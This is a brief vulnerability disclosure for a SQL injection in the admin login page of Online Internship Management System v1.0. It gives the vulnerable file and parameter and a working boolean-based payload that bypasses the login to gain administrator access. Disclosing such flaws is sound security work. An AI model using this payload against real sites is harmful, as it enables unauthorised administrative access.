# Online Internship Management System v1.0 has SQL injection

BUG_Author:HaolunSong

Website source code address: https://www.sourcecodester.com/php/14712/online-internship-management-system-phpmysqli-full-source-code.html

Vulnerability File: /internship/admin/login.php

POST parameter 'email' exists SQL injection vulnerability

Payload1:email=-1' or 567=567#&password=2&login=

Boolean injection successful, can use any account to log in to the administrator account

![image](https://github.com/csbsong/bug_report/blob/main/sql1.png)
